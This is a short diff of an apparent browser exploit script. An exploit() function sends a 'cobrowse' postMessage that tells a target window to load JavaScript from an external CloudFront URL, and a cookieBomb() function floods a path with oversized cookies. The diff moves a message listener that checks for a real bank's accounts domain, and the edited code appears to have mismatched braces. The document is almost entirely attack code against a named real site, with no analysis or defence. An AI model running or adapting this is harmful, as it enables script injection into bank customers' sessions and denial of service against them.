@@ -19,19 +19,13 @@ function exploit()
         target.postMessage('{"_name":"cobrowse", "_data":{"url":"https://d1af033869koo7.cloudfront.net/psp/united-v1-001/247px.js"}}',"*");
         
     },5000);
- debugger;
-window.addEventListener("message", (event) => {
-    if (event.origin !== "https://myaccounts.capitalone.com/") {
-        console.warn("Response from untrusted origin:", event.origin);
-        return;
-    }
 
-    console.log("Acknowledgment from target domain:", event.data);
 });
- debugger;
+
    
 
 }
+
 
 
 function cookieBomb()
@@ -41,6 +35,14 @@ function cookieBomb()
     {
         document.cookie=`bomb${i}=${p};path=/frontends/files/xd.html;max-age=600;SameSite=None;Secure`;
     }
+ debugger;
+window.addEventListener("message", (event) => {
+    if (event.origin !== "https://myaccounts.capitalone.com/") {
+        console.warn("Response from untrusted origin:", event.origin);
+        return;
+    }
+
+    console.log("Acknowledgment from target domain:", event.data);
 }
 
 
